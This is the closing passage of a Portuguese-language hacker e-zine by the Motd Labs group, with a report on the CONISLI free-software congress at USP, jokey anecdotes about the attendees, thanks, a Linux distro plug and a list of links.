jovens, derrubarmos essa ditadura que já impera por muitos anos... Desde  quando
surgiu o primeiro exploit, o primeiro vírus (boot), o primeiro computador...

Voltando ao  assunto do  Conisli, só  tenho a  dizer que  teve tudo  do bom e do
melhor.      Conseguiram       juntar      o       útil      ao       agradável:
Linux+Computadores+Internet+Hackers(?)+Pessoas  que  entendem  muito  de   tudo.
Ahhhh,  vocês perderam  as garotas  da LinuxChix,  que é  um grupo  feminino de
usárias de linux...:D. Jonh Maddog esteve presente, um velhinho muito  simpático
que quase falei  o que eu  queria ganhar de  Natal!!! Sim, ele  é igual o  Papai
Noel! Chega da minha infantilidade. O Congresso também contou com a presença  de
Antônio Marcelo - Honeypot-BR e ex da bufferoverflow.org - que deu uma  palestra
muito  interessante  sobre  honeypot.  Sandro  Melo  também  deu  uma execelente
palestra sobre Varreduras e Técnicas de  rede que abrangeu ao máximo os  tipo de
varreduras  que podem  ser feitas.  Carlos E.  Morimoto -  Criador do  Kurumin 
- também esteve presente, mas não  pudermos assitir à sua palestra por  estarmos
presente na  seção do  install fest,  galera super  10 que  deu total  apoio aos
usuários  leigos em  linux que  levaram seus  pcs para  ser instalados  diversas
distribuições e  deram apoio  também à  cultura hacker  com a  presença deles na
nossa palestra.

É galera, é impossível falar de todos os detalhes nesses dois dias de  congresso
que marcou o grupo  e o movimento hacker,  mas só posso dizer-lhes  isso. Espero
não ter  esquecido de  nada nem  de ninguém.  Então até  a próxima  e-zine ou me
encontre no canal. Tchau!

Hehehe, não ia esquecer de uma pessoa não.

Após nosso  debate na  mesa, sobrou  um povo  que começou  a conversar conosco e
dentre eles, tinha uma figura que  virou mito no hacking ético. Graças  aos meus
olhos treinados,  que possuem  uma percepção  afiada e  uma capacidade de piscar
inegualável! Reparei que um senhor (que insistiu que eu o chamasse de VOCÊ!  :))
tinha uma barata na camiseta (de desenho, não de verdade!), uma barata dentro de
um computador!  Não pensei  duas vezes.  Perguntei seu  nome e  a resposta foi a
esperada: - Derneval.

Sim,  Derneval Ribeiro  Rodrigues da  Cunha, o  criador da  primeira fanzine  no
Brasil que divulgou  o hacking ético  a todos pela  primeira vez na  história de
nosso país no dia 3 de Dezembro  de 1994 chamado de “BARATA ELÉTRICA”, que  pode
ser  conferido em:  http://www.barataeletrica.cjb.net. Todos  ficamos mudos  por
alguns instantes. Ele  é sujeito muito  simpático, humilde e  desconfiado... :D,
que por incrível que pareça ainda está na ativa, mas com passo lento. E sim, ele
está disposto a levar nosso movimento à frente de tudo e de todos para chegarmos
a nossa meta: Muda a imagem negativa que o hacking possui.

Derneval, saiba que o  grupo MOTD sempre estará  aberto a pessoas como  você que
além de querer aprender, quer ajudar a disponibilizar todas informações e  mudar
nossa imagem. Estaremos sempre a  disposição e nunca deixe de  acreditar naquilo
em que você sempre  sonhou. Obrigado por tudo  e sempre que precisar  peça nossa
ajuda.

Agora  sim,  espero não  ter  esquecido de  ninguém.  Ahhh, do  sqwalk  (Rafael)
(Rafael), ele que é do fusion iria participar da mesa de discussão mas não  pôde
por  problemas   pessoais  (mulher,   filho).  Sei   que  ficou   chateado,  mas
oportunidades como esta não irão acabar tão cedo (espero...:)).

Congressos como este, só nos ensina que atrás de um pequeno nick, há uma  grande
pessoa.  Desejo  à  vocês, caros  leitores,  toda  sorte do  mundo  e  que nunca
desacredite nos seus sonhos e ambições, por mais impossível que pareça. Pois pra
mim era impossível e loucura, irmos na USP, num congresso como a Conisli, com  5
pessoas, discutirmos sobre a verdadeira cultura hacker para dezenas de  pessoas.
:). Vencemos uma batalha, mas nos resta uma guerra pela frente... 

Agradecimento em  especial ao  Sefer_Zohar, que  sem ele  nada disso  teria sido
possível (ele que  deu a idéia  de abrir um  espaço pra nós);  ao Inferninh0 que
após horas de discussões  no irc, resolveu ir  de última hora no  evento; ao dmr
que é um "mestre de furar tabocas com varas de bambú" :) e ao dum_dum, que falou
+ que  nós mas  respondeu diretamente  e corretamente  todas as  perguntas tanto
socialmente quanto tecnicamente; e faltou  o sqwalk (Rafael) que não  pôde estar
presente na mesa de  discussão, mas deixou conosco  seu apoio. Obrigado a  todos
pelo apoio que deram e obrigado à você, newbie, que está lendo esse artigo até o
final!!! :)

  
Um Cordial abraço para todos,

IP_FIX - Everson. 

“Hacker não destrói, não invade, não  rouba. Apenas cria, melhora e protege.”  –
IP_FIX no Congresso do Software Livre realizado na USP.
 

Fatos Cômicos do Evento:

Na parte da install fest, dum_dum e eu ia sair pra assistir uma das palestras  e
na hora de sair  Jonh Maddog agarrou ele  para tirar várias fotos.  Vocês tinham
que ver o sorriso que ficou na cara do garoto que foi bem maior que esse :D

Depois das fotos, viram um inseto nas costas do Maddog e quando viram, começaram
a gritar: 
"- TEM UM BUG NO MADDOG!!! TEM UM BUG NO MADDOG!!!" :D

E tem  outra do  Maddog. Ele  entrou na  salinha para  tirar fotos em que estava
reunido o pessoal do Install Fest e  nessa sala tinha uma lousa (que usa  caneta
piloto pra escrever) que tava  escrito +/- isso: “Não fazer  downloads. Internet
estrupada por I.F. (Install Fest). Beleza, normal isso, a não ser pelo fato de o
Maddog ter tirado foto com o ESTRUPADA POR I.F bem do seu lado...

No domingo, cheguei lá com o Inferninh0 na hora do almoço e um pessoal se reuniu
lá na  Install Fest  para almoçar  e vimos  um sujeito  que encostou na lousa, e
quando ele  saiu vimos que a palavra “ESTRUPADA” sumiu da lousa!!! Só estava  um
pouco do final: “PRADA”. E quando  o sujeito virou de costa, vimos:  “ESTRUP..”.
Demos  muita risada  e ainda  se defendeu:  “- Ahhh,  sorte que  só ficou  meia
palavra...”.  E nessa  eu retruquei:  “- Verdade,  mas pra  bom entendedor  MEIA
PALAVRA basta...!!!” :D:D:D

Logo  após o  BOOK de  fotos que  dum_dum tirou  com Maddog  (sim, foram  muitas
fotos), o celular dele começa a tocar no bolso, e ao atender, o celular virou um
sabão e pega  aqui, escorrega, pega  denovo, soltou, mais  uma vez e  cai, tenta
mais uma mas deixa cair no chão,  e quando estava caindo, o Rafael (sqwalk)  foi
tentar amortecer a queda deixando-o cair em cima de seu pé... Pra que...  Quando
ele foi por o pé  em baixo acabou dando uma  “bicuda” no celular que quase  caiu
dentro do lixo (chegou a bater no latão)!!! No fim ele conseguiu atender. Era  o
dmr falando que queria rachar a taboca dele!!! Não me perguntem o que é TABOCA!

Sefer_Zohar estava discutindo (conversando normal, mas com uma atenção tremenda)
com o Antônio Marcelo bem excitamente, quando no meio da conversa, sem mais  nem
menos, muito subtamente ele  vira para o lado  e fala: "- Vamos  assistir Matrix
Revolution???".  Todo mundo  olha pra  ele e  fica sem  entender nada.  Essa só
estando lá mesmo pra entender... :)

Quando  fui  aprensentar  o  Inferninh0 pra  galera,  aprensentei  como  o maior
Defacer, Lamer  e Script  Kiddie do  Brasil. Todo  mundo zoou  ele e demos muita
risada disso... Exceto o dmr, que acreditou que isso era verdade...

Inferninh0, que mal  abria a boca  pra falar Oi,  Tchau e Blz,  se arrenpedia de
abri-la para falar seu  nick para o pessoal  que não o conhecia:  "- Inferninh0?
Você é kiddie, defacer ou o quê???", “- Daonde você arrumou esse nick???” :)

Durante a nossa palestra,  fizeram uma pergunta e  ele se referiu assim:  "-Vejo
que você são  muito jovens... -  e quando olhou  para mim (IP_FIX)  - ...e muito
adolescentes  também...".  Pô!  Pode  me  chamar  de  crinça  que  não  ligo! Os
Sefer_Zohar, dum_dum, sqwalk  (Rafael) e Inferninh0  me encontraram na  primeira
vez que me viram por causa da minha cara de 12 anos. E só para esclarecer: Tenho
16 anos!!! :D 

E pra encerrar. O Derneval voltou de  trem/metrô com a gente, e ao entrarmos  no
vagão,  percebamos  que  estava quase  completamente  vazio  e quando  sentamos,
reparei que ele (Derneval) estava sentado  no banco de idosos. Não que  ele seje
velho,  mas a  carapuça serviu...  Ele reparou  que falei  pro inferninh0  dando
risada, e nesse instante deu um desespero nele: “ – Deixa eu sentar aí, deixa eu
sentar aí, deixa eu sentar aí...  – disse ele para o dum_dum,  mandando-o sentar
no banco de idosos. :D

Houve muitos fatos engraçados, mas foram menos que este e não tem palavras  para
descrever. Só  quem tava  mesmo que  aproveitou essa  reunião de malucos... Isso
porque não falei que o Sefer_Zohar saiu arranhado no braço pelo dum_dum. Qual  é
gente? Sem preconceito!!! Não é só porque que dormiram no mesmo quarto, que isso
seje muito supeito (muito mesmo...:)).
 

É só isso galera, espero não ter ofendido ninguém, principalmente Sefer_Zohar  e
dum_dum, mas se ofendi eu já peço desculpas... Abraços e até a próxima galera.

[]´s

IP_FIX.

PS: Não aconteceu nada com dum_dum e Sefer_Zohar. Dmr estava no quarto também! :)   
PS2: Se ofendi alguém nesse meu infame  senso de humor, me desculpem + uma  vez,
mas foram detalhes inesquecíveis e bizarros!!!





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 23 ]=-=[ Links e Agradecimentos ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Bom galera, chegou a hora das  despedidas, elas são tristes mas animadoras  pois
sei que se chegaram até aqui é  porque aproveitaram essa e-zine até o final  (ou
pulou pra cá direto,  hehehe :)). Espero que  tenha sido de grande  ajuda, mesmo
porque o objetivo não é ensinar ninguém a se expert, muito menos hacker. Ela  só
é  a  porta do  caminho  que muito  de  nós estamos  percorrendo  e dificilmente
pararemos e  queremos que  vocês percorram  também. “Há  uma grande diferença em
saber o caminho e trilhar o caminho” – Morpheus – Matrix

A  mensagem que  quero passar  pra vocês  é que  não desistam  daquilo que  você
acredita e  não se  consegue nada  sem esforço.  Pra tudo  que façamos existe um
preconceito, a  solução é  passar por  cima dele.  Não importa  se nos chamam de
“ladrões virtuais ou vândalos”. Sabemos que não somos. E não é só porque aparece
pedras no caminho  é que vamos  desistir no primeiro  tombo, ninguém aprendeu  a
andar sem cair.

É só galera, só quero falar pra vocês que o grupo motd está aberto ao que der  e
vier. Não tenha medo  de perguntar. Só não  faça perguntas cretinas como:  “- Me
ensina a invadir.” Pois não iremos  tolerar, estamos aqui pra ajudar e  não para
ensinar rodar um exploit pra tal falha. Espero que tenham me entendido.

Agradeço  ao  SKOFF,  Sefer_Zohar,  Inferninh0,  dum_dum,  dmr,  sqwalk, bronco,
hallucination, greenhornet, nashleon  (coracaodeleao), nibble, omdule  (module),
habeas,   Le_AmBAr,   REPOLHO,   ByNaRiuS,   emmanuele,   cod3x,  BlackSheep182,
Soldier_of_Dark,  d4rwin,  Vo5,  Caiobat,  HazzarD,  RedEyes,  Jakk_,  SkyNet45,
Gold_Boy,  OmegaB1te, Waldirio,  Narcotic, s0ul,  deadsckt, Derneval,  mpacheco,
reign, Haze, Lorena, V4mp1r4 e a todos que colaboraram de certa forma com o motd
e ao que eu esqueci. :). Até a próxima edição.

“Pra tudo que tem um começo, tem um fim.” – Agente Smith ao ponto de matar o Neo



O que segue abaixo (Brasileirinho) é de um idealizador que não tem vínculos  com
o motd, mas também atua na área de segurança.


:: Brasileirinho gnu\linux ::

O brasileirinho gnu\linux é uma mini distribuicao, voltado para programadores  e
usuarios  que gostam  cioonfigurar tudo  na mão,  e também  serve para  usuarios
iniciantes que tem a intencao de apenas aprender ou saber como funciona o linux.

Se voce usa o  Windows9X, NT, 2000, XP,  MSDOS, nao é preciso  reparticionar seu
HD, pois ele  e totalmente instalavel  em qualquer destes  sistemas operacionais
sem precisar modificar nada no seu sistema operacional. Ele funciona em qualquer
computador apartir de 486, 8 mb de memoria ram e com 200 mb no hd livre.

Site para download: http://www.brasileirinho.phx.com.br

Está versão  é recomendada  para quem  que ajudar  no projeto  ja que como é uma
distribuição nova ha muito caminho a percorrer.

Se quiser ajudar entre em contato por:
#brasileirinho - Rede Brasnet: irc.brasnet.org


Links:
http://www.motdlabs.org
http://www.infoshack.cjb.net
http://cdm.frontthescene.com.br
http://www.frontthescene.com.br
http://www.barataeletrica.cjb.net
http://coracaodeleao.virtualave.net
http://unsekurity.virtualave.net
http://www.hallucinated.kit.net
http://www.infernoz.kit.net
http://www.phrack.com
http://www.w00w00.org
http://www.txt.org
http://www.honeypot.com.br
http://www.conisli.org.br
http://www.google.com.br
http://www.brasileirinho.phx.com.br

Existe uma  infinidade de  outros links  que não  puderam ser  citados aqui  por
questão  de  esquecimento, mas  que  poderão ser  passados  na nossa  mail-list.
Agradecemos a compreensão.

 

Atenciosamente,
 

Motd Labs.


_EOF_